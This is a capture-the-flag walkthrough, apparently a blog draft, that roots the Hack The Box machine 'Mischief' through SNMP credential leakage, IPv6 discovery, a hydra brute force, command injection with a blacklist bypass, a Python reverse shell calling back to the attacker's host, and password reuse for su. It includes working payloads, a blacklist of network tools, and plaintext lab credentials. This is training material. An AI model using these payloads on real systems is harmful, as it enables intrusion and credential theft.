---
published: false
---
Start off with an nmap scan:
```
root@kali: nmap -sC -sV -oN nmap 10.10.10.92 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-15 10:25 AEDT
Nmap scan report for 10.10.10.92
Host is up (0.23s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.94 seconds
```

Not a lot we can do with that, to broaden the range with both an nmap UDP and all TCP ports:
```
root@kali: nmap -sU -oN nmap-udp 10.10.10.92
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-15 10:32 AEDT
Nmap scan report for 10.10.10.92
Host is up (0.23s latency).
Not shown: 999 open|filtered ports
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 77.44 seconds


root@kali: nmap -p- --max-retries 1 -Pn -T4 --oN nmap-allports 10.10.10.92
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-15 10:46 AEDT
Nmap scan report for 10.10.10.92
Host is up (0.23s latency).
Scanned at 2018-12-15 10:46:16 AEDT for 256s
Not shown: 65533 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3366/tcp open  creativepartnr

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 256.52 seconds
           Raw packets sent: 131229 (5.774MB) | Rcvd: 408 (21.216KB)
```

While the all port scan runs, lets look at the box's snmp:
```
root@kali: snmp-check 10.10.10.92
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.92:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.10.92
  Hostname                      : Mischief
  Description                   : Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
  Contact                       : Me <me@example.org>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 4 days, 20:15:01.97
  Uptime system                 : 4 days, 20:14:50.64
  System date                   : 2018-12-14 23:34:43.0

[*] Network information:

  ...

[*] Network interfaces:

  ...


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  2                     10.10.10.92           255.255.255.0         1                   
  1                     127.0.0.1             255.0.0.0             0                        

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               22                    0.0.0.0               0                     listen              
  0.0.0.0               3366                  0.0.0.0               0                     listen              
  127.0.0.1             3306                  0.0.0.0               0                     listen              
  127.0.0.53            53                    0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               161                 
  0.0.0.0               40207               
  127.0.0.53            53                  

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              systemd               /sbin/init            maybe-ubiquity      
  2                     runnable              kthreadd                                                        
  ...                             
  689                   runnable              iscsid                /sbin/iscsid                              
  707                   runnable              sh                    /bin/sh               -c /home/loki/hosted/webstart.sh
  711                   runnable              sh                    /bin/sh               /home/loki/hosted/webstart.sh
  713                   runnable              python                python                -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
  724                   runnable              agetty                /sbin/agetty          -o -p -- \u --noclear tty1 linux
  771                   runnable              apache2               /usr/sbin/apache2     -k start            
  781                   runnable              mysqld                /usr/sbin/mysqld      --daemonize --pid-file=/run/mysqld/mysqld.pid
  ...

[*] Storage information:

  ...


[*] File system information:

  ...

[*] Device information:

  ...

[*] Software components:

  Index                 Name                
  1                     accountsservice-0.6.45-1ubuntu1
  2                     acl-2.2.52-3build1  
... 
  625                   zerofree-1.0.4-1    
  626                   zlib1g-1:1.2.11.dfsg-0ubuntu2
```

We can see an interesting line in the results that the server is running a [SimpleHTTPAuthServer](https://github.com/tianhuil/SimpleHTTPAuthServer)

Reading the usage we can see that the command includes a port number and credentials:
```
root@kali: python -m SimpleHTTPAuthServer -h          
usage: SimpleHTTPAuthServer [-h] [--dir DIR] [--https] port key

positional arguments:
  port        port number
  key         username:password

optional arguments:
  -h, --help  show this help message and exit
  --dir DIR   directory
  --https     Use https
```

Once the all port scan finishes we can see that port 3366 is open to us, (our snmp-check also confirms that the server is listening on that port)

Browsing there we are prompted for HTTP Authentication credentials:
![223543464.png]({{site.baseurl}}/Images/Mischief/223543464.png)


We use the creds loki:godofmischiefisloki and gain access to the site.

Preparing for our gobuster enumeration we try to navigate to a 404 page to see if we can get the server to leak some information (server version, web server etc) and we see that a page is returned:
![223543301.png]({{site.baseurl}}/Images/Mischief/223543301.png)


Initially we believed that this was a custom error page with a HTTP 200 response as a way to block tools like gobuster and dirbuster. So we went straight to wfuzz instead:

root@kali: wfuzz --hw 25 -t50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --basic loki:godofmischiefisloki http://10.10.10.92:3366/FUZZ


We add the --hw 25 to hide the custom 404 page from the results.

snmp mentioned that Apache was running on the machine, but none of our nmap scans picked it up. We just looked at one website, but that was a python one. The only 2 reasons Apache is running and we can see the site are:
1. Apache is listening on localhost only (127.0.0.1:80)
1. Apache is listening on a different address or network adapter.

Hack The Box does not provide IPv6 addresses so we need to work it out. Following a guide on how to get an IPv6 address from snmp (http://docwiki.cisco.com/wiki/How_to_get_IPv6_address_via_SNMP) we are able to use smnpwalk to manually work out the IPv6 address of the box:
```
root@kali: snmpwalk -v2c -c public 10.10.10.92 1.3.6.1.2.1.4.34.1.3 
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.92 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.164.200.21 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.164.200.21 = INTEGER: 2
```

This looks like a lot of garbage to start with, but what we want to do is look at the last 2 lines of the output. Using a decimal to hex converter we take every number after the iso.3.6.1.2.1.4.34.1.3.2.16 and convert it to its HEX value for example 222 converts to DE running through all the numbers we get the following results:
```
222.173.190.239.0.0.0.0.2.80.86.255.254.164.200.21 	-- SNMP decimal value
DE.AD.BE.EF.00.00.00.00.02.50.56.FF.FE.A4.C8.15		-- Each decimal converted to HEX
DEAD:BEEF:0000:0000:0250:56FF:FEA4:C815				-- Convert the HEX to IPv6 format

254.128.0.0.0.0.0.0.2.80.86.255.254.164.200.21
FE.80.00.00.00.00.00.00.02.50.56.FF.FE.A4.C8.15
FE80:0000:0000:0000:0250:56FF:FEA4:C815
```

In the end we have 2 IPv6 addresses to try, DEAD:BEEF:0000:0000:0250:56FF:FEA4:C815 and FE80:0000:0000:0000:0250:56FF:FEA4:C815

Looking at our own ifconfig we can see that we also have 2 IPv6 addresses and one looks very similar to one of our outputs.
```
ifconfig tun0
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.12  netmask 255.255.254.0  destination 10.10.14.12
        inet6 dead:beef:2::100a  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::1685:d7dd:77d4:cec9  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 1421476  bytes 175522866 (167.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1578154  bytes 137199887 (130.8 MiB)
        TX errors 0  dropped 68 overruns 0  carrier 0  collisions 0
```


The first address is the global or public IPv6 address that the rest of the network sees us as, the second address is a 'private' address that is not accessible to the rest of the network similar to the IPv4 loopback address.

Running an IPv6 ping we can see that we can only access the OpenVPN ip from our kali machine:
```
root@kali: ping -6 -c4 dead:beef:0000:0000:0250:56ff:fea4:c815                                   
PING dead:beef:0000:0000:0250:56ff:fea4:c815(dead:beef::250:56ff:fea4:c815) 56 data bytes
64 bytes from dead:beef::250:56ff:fea4:c815: icmp_seq=1 ttl=63 time=231 ms
64 bytes from dead:beef::250:56ff:fea4:c815: icmp_seq=2 ttl=63 time=231 ms
64 bytes from dead:beef::250:56ff:fea4:c815: icmp_seq=3 ttl=63 time=230 ms
64 bytes from dead:beef::250:56ff:fea4:c815: icmp_seq=4 ttl=63 time=231 ms
^C
--- dead:beef:0000:0000:0250:56ff:fea4:c815 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 8ms
rtt min/avg/max/mdev = 230.363/230.842/231.253/0.575 ms

root@kali: ping -6 -c4 fe80:0000:0000:0000:0250:56ff:fea4:c815
PING fe80:0000:0000:0000:0250:56ff:fea4:c815(fe80::250:56ff:fea4:c815) 56 data bytes
From fe80::20c:29ff:fe9b:4edd%eth0: icmp_seq=1 Destination unreachable: Address unreachable
From fe80::20c:29ff:fe9b:4edd%eth0: icmp_seq=2 Destination unreachable: Address unreachable
From fe80::20c:29ff:fe9b:4edd%eth0: icmp_seq=3 Destination unreachable: Address unreachable
From fe80::20c:29ff:fe9b:4edd%eth0: icmp_seq=4 Destination unreachable: Address unreachable

--- fe80:0000:0000:0000:0250:56ff:fea4:c815 ping statistics ---
4 packets transmitted, 0 received, +4 errors, 100% packet loss, time 76ms
pipe 4
```


The next step is to re-enumerate the box with this IP address. We can see that we get some different results in our nmap scan:
```
root@kali: nmap -sC -sV -oN nmap-ip6 -6 dead:beef:0000:0000:0250:56ff:fea4:c815
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-15 12:39 AEDT
Nmap scan report for dead:beef::250:56ff:fea4:c815
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:a4:c8:15
|_      manuf: VMware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.31 seconds
```

You might notice that Firefox does not handle IPv6 addresses directly, so we need to update our /etc/hosts file to map it to a friendly name:
(After further research we also found that you can wrap the IPv6 address in square brackets  and Firefox will browse there: [beef:0000:0000:0250:56ff:fea4:c815]
```
root@kali: vim /etc/hosts
...
# The following lines are desirable for IPv6 capable hosts
...
dead:beef:0000:0000:0250:56ff:fea4:c815 mischief.htb
```


Now if we browse to http://mischief.htb we are presented with a new website:
![223870986.png]({{site.baseurl}}/Images/Mischief/223870986.png)




We try the credentials listed on the first website to try and log in to the website. Neither of them work, so the next step is to try and brute force some candidates from a custom wordlist. We generate two lists. One with potential usernames and another with potential passwords:
```
root@kali: cat users.txt
loki
god
mischief
trickery
deceit
username
password
miscief
admin
administrator
user
root
trickster
guest

root@kali: cat passwords.txt
loki
godofmischiefisloki
trickeryanddeceit
god
of
mischief
is
trickery
and
deceit
godofmischief
username
password
credentials
miscief
admin
administrator
user
root
trickster
guest
```


The lists were generated from splitting all the words in the passwords we have encountered so far, miscief comes from the page title of the first website, this could be a typo, or could be on purpose, this is a trolly box so we assume nothing is a mistake, at the end we have also added some common default credentials.

We use burp to intercept a test login request and can see that a failed login includes some new content on the page "Sorry, those credentials do not match"
![223543345.png]({{site.baseurl}}/Images/Mischief/223543345.png)


We can use the details of this request combined with the tool hydra to brute force the login form:
```
root@kali: hydra -L user.txt -P passwords.txt mischief.htb http-post-form "/login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-15 13:12:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 400 login tries (l:20/p:20), ~25 tries per task
[DATA] attacking http-post-form://mischief.htb:80//login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match
[80][http-post-form] host: mischief.htb   login: administrator   password: trickeryanddeceit
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-12-15 13:13:44
```


We get a hit! The credentials administrator:trickeryanddeceit are able to log in to the site:
![223576097.png]({{site.baseurl}}/Images/Mischief/223576097.png)


The website states that there are credentials in one of the users home directory's, sounds like a good next step to work towards.

Intercepting the default request with Burp we can see that we get no command output from the ping request:
![223739951.png]({{site.baseurl}}/Images/Mischief/223739951.png)


It looks like simply adding a new line character [ENTER] after the ping command gets the site to show the command output:
![45643.png]({{site.baseurl}}/Images/Mischief/45643.png)


Starting with some basic command chaining we can see who the website is running as:
```
command=whoami; ping -c 2 127.0.0.1

www-data
```

Then we move on to testing if we can read files with: 
```
command=cat /etc/passwd; ping -c 2 127.0.0.1
```

and we get the contents of the /etc/passwd file:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
loki:x:1000:1004:loki:/home/loki:/bin/bash
Debian-snmp:x:111:113::/var/lib/snmp:/bin/false
mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
```

Looking at the file contents we can see there are only two users; root and loki. We try ls -la /home/loki; ping -c 2 127.0.0.1 but we get a command not allowed error.

Luckily there are many ways to list the contents of a directory, echo is one of them:
```
command=echo /home/loki/*; ping -c 2 127.0.0.1
/home/loki/credentials /home/loki/hosted /home/loki/user.txt
```

So we can see that the credentials file we are after is in loki's home directory.

Attempting to cat it directly we get another command not allowed message, which is weird, because we were just able to cat /etc/passwd

To see if its a permissions issue on the file we can use the stat command:
```
stat /home/loki/credentials
```

This also does not work, what happens if we try a different file in the same directory (that we should not have permissions to read):
```
stat /home/loki/user.txt
File: /home/loki/user.txt
  Size: 33        	Blocks: 8          IO Block: 4096   regular file
Device: 802h/2050d	Inode: 662102      Links: 1
Access: (0400/-r--------)  Uid: ( 1000/    loki)   Gid: ( 1004/    loki)
Access: 2018-12-15 04:05:04.802723847 +0000
Modify: 2018-05-17 18:52:25.203970134 +0000
Change: 2018-05-17 20:29:43.611852308 +0000
 Birth: -
```

We can see that stat should work even if we have no permissions on the file. So the error was not due to the fact that we don't have permissions on the credentials file. This leads us to suspect that there is a blacklist on the words allowed through the web application. Luckily for us bash will ignore certain characters when running commands. We are able to split the word with '' for bash to do nothing, but the web application might be dumb enough to treat them as part of the string when performing its string compare against the blacklist:
```
command=cat /home/loki/cred''ent''ials; ping -c 1 127.0.0.1
```

Initially this does not seem to work, this could be because the blacklist contains portions of the words as well like cred etc. but if we expand it to separate every letter we get a result:
![223707216.png]({{site.baseurl}}/Images/Mischief/223707216.png)


As we read these credentials from loki's home directory and we remember from our initial nmap scan that the box has SSH open, we assume they can be used to SSH into the box as loki.
```
ssh loki@10.10.10.92
loki@10.10.10.92's password: 
...
loki@Mischief:~$ cat user.txt
bf58078e7b802c[redacted]
```

We read the user.txt and now it's time to move on to root.

Now that we are on the box lets do some basic enumeration. We can see that we have some bash history:
```
loki@Mischief:~$ cat .bash_history
python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
exit
free -mt
ifconfig
cd /etc/
sudo su
su
exit
su root
ls -la
sudo -l
ifconfig
id
cat .bash_history 
nano .bash_history 
exit
```

Looking at the contents of the file, there is something interesting, the SimpleHTTPAuthServer password looks different to the one we found initially in our snmp enumeration. Lets add that to our custom wordlist we created earlier just in case. loki:lokipasswordmischieftrickery

The next step in the enumeration process is to look at the source code for the web application, sometimes they contain passwords, code comments or other hints. We can see from the database.php file that we have some mysql credentials:
```
<?php
$server = 'localhost';
$username = 'debian-sys-maint';
$password = 'nE1S9Aw1L0Ky3Y9h';
$database = 'dbpanel';
```


The index.php file contains the blacklist of commands they did not want us to run from the website:
```
<?php
if(isset($_POST['command'])) {
	$cmd = $_POST['command'];
	if (strpos($cmd, "nc" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "bash" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "chown" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "setfacl" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "chmod" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "perl" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "find" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "locate" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "ls" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "php" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "wget" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "curl" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "dir" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "ftp" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "telnet" ) !== false){
		echo "Command is not allowed.";
	} else {
		system("$cmd > /dev/null 2>&1");
		echo "Command was executed succesfully!";
	}
}
?>
```

Most of these seem reasonable, but one standout, that was new to me at least, was the setfacl command.

After doing some research the commands getfacl and setfacl have to do with Access Control List (ACL) settings on Linux. Because the application specifically wanted to block this command we should look for any files with ACLs applied:
```
loki@Mischief: getfacl -R -s -p / | sed -n 's/^# file: //p'
...
//usr/bin/sudo
//bin/su
//var/log/journal
```

Once we have a list of files, we can use getfacls to look at the specifics of the ACLs and get a better insight into whats applied to the files:
```
loki@Mischief:~$ getfacl /usr/bin/sudo
getfacl: Removing leading '/' from absolute path names
# file: usr/bin/sudo
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x

loki@Mischief:~$ getfacl /usr/bin/su
getfacl: Removing leading '/' from absolute path names
# file: usr/bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```

Looks like our loki user has been specifically blocked from running sudo and su, but all other users are able to execute it.

There are no other users in the /etc/passwd file, but from previous experience we have been able to get reverse shells as accounts such as mysql and www-data and we have a website that can already run commands as www-data

With the knowledge we have of the blacklist we need to craft a reverse shell payload. We can use the loki ssh session to test it out and fix the payload till we get a working one. We know that the black list does not block python so we look up our reverse shell cheatsheet and grab the python sample, updating the ip address and port with our own.
```
loki@Mischief:~$ which python
/usr/bin/python
loki@Mischief:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


Our standard reverse shell payloads and other means of connecting back to our attacking machine hang (curl, wget etc), this indicates that there is a firewall or iptable rules in place blocking our connections. There are a few things we can also test to see the bounds of the iptables rules, these include trying UDP ports or IPv6 connections.

The default nc is not able to create an IPv6 listener.  We can verify this by setting up a listener and viewing our netstat
```
root@kali: nc -nlvp 443
...
root@kali: netstat -an | grep LISTEN
netstat -an | grep LISTEN 
tcp       0      0 0.0.0.0:443                  :::*                    LISTEN   
```

In order to listen on tcp6 we need to install the openbsd version of netcat with apt-get install netcat-openbsd. Once we have that installed we can use it to listen on IPv6:
```
root@kali: nc.openbsd -6 -nlvp 443 
```


In another terminal we can verify it with the same netstat command
```
root@kali: netstat -an | grep LISTEN 
tcp6       0      0 :::443                  :::*                    LISTEN    
```

Now to get our python reverse shell to run on IPv6 we need to change the socket type from AF_INET to AF_INET6. Once we have done that, we update the attacker IP to be the IPv6 and our final command comes out to be:
```
command=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::100a",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'; ping -c 1 127.0.0.1
```

and we get a reverse shell as www-data:
```
root@kali: nc.openbsd -6 -nlvp 443 
Listening on [::] (family 10, port 117499167)
Connection from dead:beef::250:56ff:fea4:92ba 35944 received!
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Now we use our standard python -c 'import pty; pty.spawn("/bin/bash")' to get a bash shell and see if we can run sudo:
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@Mischief:/var/www/html$ sudo ls
sudo ls
sudo: unable to resolve host Mischief: Resource temporarily unavailable
[sudo] password for root: 
```

Finally something useful, we can see that we are able to run sudo, all we need is the root password.

Remembering how much of a troll this box has been so far, we go back and try our custom word list and eventually we do get a hit with the password from loki's bash_history:
```
www-data@Mischief:/var/www/html$ sudo ls
sudo ls
sudo: unable to resolve host Mischief: Resource temporarily unavailable
[sudo] password for root: lokipasswordmischieftrickery

www-data is not in the sudoers file.  This incident will be reported.
```

When we get that message it means that the log in was successful, but the www-data user is not a sudoer, but the other binary that loki is not allowed to use was su which allows us to change our current user:
```
www-data@Mischief:/var/www/html$ su root
su root
Password: lokipasswordmischieftrickery

root@Mischief:/var/www/html# cd /root
cd /root
root@Mischief:~# ls
ls
root.txt
root@Mischief:~# cat root.txt
cat root.txt
The flag is not here, get a shell to find it!
```

And we get another troll.

Looking around the box, there is an empty authorized_keys file:
```
root@Mischief:~/.ssh# ls -la
ls -la
total 8
drwx------ 2 root root 4096 May 14  2018 .
drwx------ 6 root root 4096 May 28  2018 ..
-rw------- 1 root root    0 May 14  2018 authorized_keys
```

Back on our attacking machine we can generate some ssh keys without a password and place the generated public key in the remote authorized_keys file:
```
root@kali: ssh-keygen -f thoseguys          
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in thoseguys.
Your public key has been saved in thoseguys.pub.
The key fingerprint is:
SHA256:8bRlSwGwVTM5Qtky5+S6ZFy97puseSNF3eE/bsG5WFc root@kali
The key's randomart image is:
...
root@kali: chmod 600 thoseguys
root@kali: cat thoseguys.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEdz ... b71Nc2H+jcCCEYRoFzxfl root@kali
```

On the target we can echo our public key into the authorized_keys file:
```
root@Mischief:~/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEdz ... b71Nc2H+jcCCEYRoFzxfl root@kali' > authorized_keys
```

Then ssh directly as root:
```
root@kali: ssh -i thoseguys root@10.10.10.92
...
root@Mischief:~# 
```

Now can we read the flag?
```
root@Mischief:~# cat root.txt
The flag is not here, get a shell to find it!
```

Nope, it must be somewhere else, so we look for any other root.txt files on the machine:
```
root@Mischief:~# find / -name 'root.*' -type f 2>/dev/null
/usr/lib/python3/dist-packages/twisted/names/__pycache__/root.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/names/root.py
/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
/usr/share/dns/root.ds
/usr/share/dns/root.key
/usr/share/dns/root.hints
/root/root.txt
root@Mischief:~# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
ae155fad479c[REDACTED]
```

Finally, we have all the flags!
